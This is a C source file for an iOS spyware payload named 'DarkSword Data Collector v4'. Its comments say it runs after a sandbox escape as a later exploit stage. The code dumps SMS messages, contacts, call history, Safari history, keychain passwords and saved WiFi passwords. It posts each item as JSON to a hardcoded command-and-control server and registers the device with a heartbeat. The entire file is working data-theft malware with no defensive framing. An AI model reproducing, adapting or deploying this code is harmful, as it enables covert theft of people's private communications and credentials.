/**
 * DarkSword Data Collector v4
 * Uses ONLY CoreFoundation + CFNetwork (like original bootstrap)
 * NO Foundation, NO UIKit - not available in WebContent process
 * 
 * Compile:
 * clang src/main.m -o collector.dylib \
 *   -framework CoreFoundation -framework CFNetwork -framework Security \
 *   -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
 *   -arch arm64 -arch arm64e -miphoneos-version-min=15.0 \
 *   -dynamiclib -Oz -Wno-deprecated-declarations
 */

#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>
#include <Security/Security.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <pthread.h>
#include <sys/utsname.h>

#define C2_HOST "192.168.2.67"
#define C2_PORT 8081

/* === SQLite via dlopen (no link dependency) === */
typedef long long sql_i64;
typedef int (*sql_open_t)(const char*, void**);
typedef int (*sql_prepare_t)(void*, const char*, int, void**, const char**);
typedef int (*sql_step_t)(void*);
typedef const char* (*sql_col_name_t)(void*, int);
typedef const unsigned char* (*sql_col_text_t)(void*, int);
typedef sql_i64 (*sql_col_i64_t)(void*, int);
typedef int (*sql_col_count_t)(void*);
typedef int (*sql_finalize_t)(void*);
typedef int (*sql_close_t)(void*);

static sql_open_t _sql_open;
static sql_prepare_t _sql_prepare;
static sql_step_t _sql_step;
static sql_col_name_t _sql_col_name;
static sql_col_text_t _sql_col_text;
static sql_col_i64_t _sql_col_i64;
static sql_col_count_t _sql_col_count;
static sql_finalize_t _sql_finalize;
static sql_close_t _sql_close;

static void init_sqlite(void) {
    void *h = dlopen("/usr/lib/libsqlite3.dylib", 1);
    if (!h) return;
    _sql_open = dlsym(h, "sqlite3_open");
    _sql_prepare = dlsym(h, "sqlite3_prepare_v2");
    _sql_step = dlsym(h, "sqlite3_step");
    _sql_col_name = dlsym(h, "sqlite3_column_name");
    _sql_col_text = dlsym(h, "sqlite3_column_text");
    _sql_col_i64 = dlsym(h, "sqlite3_column_int64");
    _sql_col_count = dlsym(h, "sqlite3_column_count");
    _sql_finalize = dlsym(h, "sqlite3_finalize");
    _sql_close = dlsym(h, "sqlite3_close");
}

/* === HTTP POST via CFNetwork (same as original bootstrap) === */
static void http_post(const char *path, const char *body) {
    char url[512];
    snprintf(url, sizeof(url), "http://%s:%d%s", C2_HOST, C2_PORT, path);
    
    CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault, url, kCFStringEncodingUTF8);
    CFURLRef cfurl = CFURLCreateWithString(kCFAllocatorDefault, urlStr, NULL);
    CFRelease(urlStr);
    if (!cfurl) return;
    
    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(kCFAllocatorDefault, CFSTR("POST"), cfurl, kCFHTTPVersion1_1);
    CFRelease(cfurl);
    if (!req) return;
    
    CFStringRef bodyStr = CFStringCreateWithCString(kCFAllocatorDefault, body, kCFStringEncodingUTF8);
    CFDataRef bodyData = CFStringCreateExternalRepresentation(kCFAllocatorDefault, bodyStr, kCFStringEncodingUTF8, 0);
    CFRelease(bodyStr);
    
    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"), CFSTR("application/json"));
    if (bodyData) {
        CFHTTPMessageSetBody(req, bodyData);
        CFRelease(bodyData);
    }
    
    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(kCFAllocatorDefault, req);
    CFRelease(req);
    if (!stream) return;
    
    /* Disable SSL validation for local network */
    CFStringRef keys[] = { kCFStreamSSLValidatesCertificateChain };
    CFBooleanRef vals[] = { kCFBooleanFalse };
    CFDictionaryRef ssl = CFDictionaryCreate(kCFAllocatorDefault, (const void**)keys, (const void**)vals, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFReadStreamSetProperty(stream, kCFStreamPropertySSLSettings, ssl);
    CFRelease(ssl);
    
    CFReadStreamOpen(stream);
    UInt8 buf[4096];
    while (CFReadStreamRead(stream, buf, sizeof(buf)) > 0) {}
    CFReadStreamClose(stream);
    CFRelease(stream);
}

/* === Helper: report data to C2 === */
static void report(const char *platform, const char *username, const char *token, const char *cached) {
    char body[4096];
    /* Manual JSON construction (no Foundation) */
    snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"%.64s\",\"username\":\"%.512s\",\"token\":\"%.1024s\",\"cachedData\":\"%.1024s\"}}",
        platform, username, token, cached);
    http_post("/api/v1/c2/report", body);
}

/* === Helper: report WiFi === */
static void report_wifi(const char *ssid, const char *pwd, const char *bssid) {
    char body[2048];
    snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"WIFI_PASSWORD\",\"data\":{\"ssid\":\"%.256s\",\"password\":\"%.256s\",\"bssid\":\"%.64s\"}}",
        ssid, pwd, bssid);
    http_post("/api/v1/c2/report", body);
}

/* === Collect SMS === */
static void collect_sms(void) {
    const char *path = "/var/mobile/Library/SMS/sms.db";
    if (access(path, R_OK) != 0) { report("SMS", "access_denied", path, ""); return; }
    if (!_sql_open) { report("SMS", "sqlite_unavailable", "", ""); return; }
    
    void *db = NULL;
    if (_sql_open(path, &db) != 0 || !db) { report("SMS", "open_failed", path, ""); return; }
    
    void *st = NULL;
    const char *sql = "SELECT m.text, h.id as handle FROM message m LEFT JOIN handle h ON m.handle_id=h.ROWID ORDER BY m.date DESC LIMIT 100";
    if (_sql_prepare(db, sql, -1, &st, NULL) != 0) { _sql_close(db); return; }
    
    int count = 0;
    while (_sql_step(st) == 100) { /* SQLITE_ROW */
        const char *text = "", *handle = "";
        for (int i = 0; i < _sql_col_count(st); i++) {
            const char *name = _sql_col_name(st, i);
            if (!name) continue;
            if (strcmp(name, "text") == 0) { const char *t = _sql_col_text(st, i); if (t) text = t; }
            else if (strcmp(name, "handle") == 0) { const char *t = _sql_col_text(st, i); if (t) handle = t; }
        }
        report("SMS", handle, text, "");
        count++;
    }
    _sql_finalize(st);
    _sql_close(db);
    
    char info[64];
    snprintf(info, sizeof(info), "%d messages collected", count);
    report("SMS", "summary", info, "");
}

/* === Collect Contacts === */
static void collect_contacts(void) {
    const char *path = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    if (access(path, R_OK) != 0) { report("Contacts", "access_denied", path, ""); return; }
    if (!_sql_open) return;
    
    void *db = NULL;
    if (_sql_open(path, &db) != 0 || !db) return;
    
    void *st = NULL;
    if (_sql_prepare(db, "SELECT p.first, p.last, v.value as phone FROM ABPerson p LEFT JOIN ABMultiValue v ON p.ROWID=v.record_id WHERE v.property=3 LIMIT 100", -1, &st, NULL) != 0) { _sql_close(db); return; }
    
    int count = 0;
    while (_sql_step(st) == 100) {
        const char *first = "", *last = "", *phone = "";
        for (int i = 0; i < _sql_col_count(st); i++) {
            const char *name = _sql_col_name(st, i);
            if (!name) continue;
            if (strcmp(name, "first") == 0) { const char *t = _sql_col_text(st, i); if (t) first = t; }
            else if (strcmp(name, "last") == 0) { const char *t = _sql_col_text(st, i); if (t) last = t; }
            else if (strcmp(name, "phone") == 0) { const char *t = _sql_col_text(st, i); if (t) phone = t; }
        }
        char fullname[512];
        snprintf(fullname, sizeof(fullname), "%s %s", first, last);
        report("Contacts", fullname, phone, "");
        count++;
    }
    _sql_finalize(st);
    _sql_close(db);
}

/* === Collect Call History === */
static void collect_calls(void) {
    const char *path = "/var/mobile/Library/CallHistoryDB/CallHistory.storedata";
    if (access(path, R_OK) != 0) { report("CallHistory", "access_denied", path, ""); return; }
    if (!_sql_open) return;
    
    void *db = NULL;
    if (_sql_open(path, &db) != 0 || !db) return;
    
    void *st = NULL;
    if (_sql_prepare(db, "SELECT ZADDRESS, ZDURATION, ZCALLTYPE FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT 100", -1, &st, NULL) != 0) { _sql_close(db); return; }
    
    int count = 0;
    while (_sql_step(st) == 100) {
        const char *addr = "";
        sql_i64 dur = 0;
        int ctype = 0;
        for (int i = 0; i < _sql_col_count(st); i++) {
            const char *name = _sql_col_name(st, i);
            if (!name) continue;
            if (strcmp(name, "ZADDRESS") == 0) { const char *t = _sql_col_text(st, i); if (t) addr = t; }
            else if (strcmp(name, "ZDURATION") == 0) dur = _sql_col_i64(st, i);
            else if (strcmp(name, "ZCALLTYPE") == 0) ctype = (int)_sql_col_i64(st, i);
        }
        char info[128];
        snprintf(info, sizeof(info), "dur:%lld,type:%d", dur, ctype);
        report("CallHistory", addr, "", info);
        count++;
    }
    _sql_finalize(st);
    _sql_close(db);
}

/* === Collect Safari History === */
static void collect_safari(void) {
    const char *path = "/var/mobile/Library/Safari/History.db";
    if (access(path, R_OK) != 0) { report("Safari", "access_denied", path, ""); return; }
    if (!_sql_open) return;
    
    void *db = NULL;
    if (_sql_open(path, &db) != 0 || !db) return;
    
    void *st = NULL;
    if (_sql_prepare(db, "SELECT url, title FROM history_items ORDER BY visit_time DESC LIMIT 100", -1, &st, NULL) != 0) { _sql_close(db); return; }
    
    int count = 0;
    while (_sql_step(st) == 100) {
        const char *url = "", *title = "";
        for (int i = 0; i < _sql_col_count(st); i++) {
            const char *name = _sql_col_name(st, i);
            if (!name) continue;
            if (strcmp(name, "url") == 0) { const char *t = _sql_col_text(st, i); if (t) url = t; }
            else if (strcmp(name, "title") == 0) { const char *t = _sql_col_text(st, i); if (t) title = t; }
        }
        report("Safari", url, title, "");
        count++;
    }
    _sql_finalize(st);
    _sql_close(db);
}

/* === Collect Keychain === */
static void collect_keychain(void) {
    /* Use Security.framework SecItemCopyMatching */
    CFTypeRef classGeneric = kSecClassGenericPassword;
    CFStringRef keys[] = { kSecClass, kSecReturnAttributes, kSecReturnData, kSecMatchLimit };
    CFTypeRef vals[] = { classGeneric, kCFBooleanTrue, kCFBooleanTrue, kSecMatchLimitAll };
    CFDictionaryRef query = CFDictionaryCreate(kCFAllocatorDefault, (const void**)keys, (const void**)vals, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching(query, &result);
    CFRelease(query);
    
    if (status == errSecSuccess && result) {
        CFArrayRef items = (CFArrayRef)result;
        CFIndex cnt = CFArrayGetCount(items);
        for (CFIndex i = 0; i < cnt && i < 100; i++) {
            CFDictionaryRef item = CFArrayGetValueAtIndex(items, i);
            if (!item) continue;
            
            CFStringRef svc = CFDictionaryGetValue(item, kSecAttrService);
            CFStringRef acct = CFDictionaryGetValue(item, kSecAttrAccount);
            CFDataRef data = CFDictionaryGetValue(item, kSecValueData);
            
            char svc_buf[256] = {0}, acct_buf[256] = {0}, pwd_buf[512] = {0};
            if (svc) CFStringGetCString(svc, svc_buf, sizeof(svc_buf), kCFStringEncodingUTF8);
            if (acct) CFStringGetCString(acct, acct_buf, sizeof(acct_buf), kCFStringEncodingUTF8);
            if (data) {
                CFIndex len = CFDataGetLength(data);
                if (len > 0 && len < 500) {
                    memcpy(pwd_buf, CFDataGetBytePtr(data), len);
                    pwd_buf[len] = 0;
                }
            }
            
            char info[512];
            snprintf(info, sizeof(info), "svc:%s", svc_buf);
            report("KEYCHAIN", acct_buf, pwd_buf, info);
        }
        CFRelease(result);
    }
}

/* === Collect WiFi === */
static void collect_wifi(void) {
    const char *path = "/var/mobile/Library/Preferences/com.apple.wifi.known-networks.plist";
    if (access(path, R_OK) != 0) { report("WiFi", "access_denied", path, ""); return; }
    
    CFURLRef fileURL = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, (const UInt8*)path, strlen(path), false);
    CFReadStreamRef rs = CFReadStreamCreateWithFile(kCFAllocatorDefault, fileURL);
    CFRelease(fileURL);
    if (!rs) return;
    
    CFReadStreamOpen(rs);
    CFPropertyListRef plist = CFPropertyListCreateWithStream(kCFAllocatorDefault, rs, 0, kCFPropertyListImmutable, NULL, NULL);
    CFReadStreamClose(rs);
    CFRelease(rs);
    
    if (!plist || CFGetTypeID(plist) != CFDictionaryGetTypeID()) {
        if (plist) CFRelease(plist);
        return;
    }
    
    CFDictionaryRef dict = (CFDictionaryRef)plist;
    CFIndex cnt = CFDictionaryGetCount(dict);
    const void **keys = (const void**)malloc(cnt * sizeof(void*));
    CFDictionaryGetKeysAndValues(dict, keys, NULL);
    
    for (CFIndex i = 0; i < cnt && i < 50; i++) {
        char ssid[256] = {0};
        CFStringGetCString((CFStringRef)keys[i], ssid, sizeof(ssid), kCFStringEncodingUTF8);
        
        CFDictionaryRef net = CFDictionaryGetValue(dict, keys[i]);
        char pwd[256] = {0};
        if (net && CFGetTypeID(net) == CFDictionaryGetTypeID()) {
            /* Try "Password" key */
            CFTypeRef pv = CFDictionaryGetValue(net, CFSTR("Password"));
            if (pv && CFGetTypeID(pv) == CFStringGetTypeID()) {
                CFStringGetCString((CFStringRef)pv, pwd, sizeof(pwd), kCFStringEncodingUTF8);
            }
        }
        report_wifi(ssid, pwd, "");
    }
    
    free(keys);
    CFRelease(plist);
}

/* === Collect Device Info === */
static void collect_device_info(void) {
    struct utsname u;
    uname(&u);
    
    char info[512];
    snprintf(info, sizeof(info), "sysname:%s,nodename:%s,machine:%s,release:%s", u.sysname, u.nodename, u.machine, u.release);
    report("DeviceInfo", u.machine, u.release, info);
}

/* === Register device === */
static void register_device(void) {
    struct utsname u;
    uname(&u);
    char body[512];
    snprintf(body, sizeof(body),
        "{\"udid\":\"native_collector\",\"deviceName\":\"%.64s\",\"model\":\"iPhone\",\"osVersion\":\"%.32s\",\"tagId\":\"1\"}",
        u.machine, u.release);
    http_post("/api/v1/devices/register", body);
}

/* === Main collection function (runs in background thread) === */
static void *collector_thread(void *arg) {
    /* Wait for sandbox escape to fully complete */
    sleep(3);
    
    register_device();
    init_sqlite();
    
    collect_device_info();
    collect_sms();
    collect_contacts();
    collect_calls();
    collect_safari();
    collect_keychain();
    collect_wifi();
    
    /* Final heartbeat */
    http_post("/api/v1/heartbeat/1",
        "{\"udid\":\"native_collector\",\"model\":\"iPhone\",\"osVersion\":\"\",\"agentActive\":true,\"currentStage\":5,\"exploitResult\":\"collected\"}");
    
    return NULL;
}

/* === Entry point - called by Stage3 via Mach-O loader === */
void ds_start(void) {
    pthread_t thread;
    pthread_create(&thread, NULL, collector_thread, NULL);
    pthread_detach(thread);
}
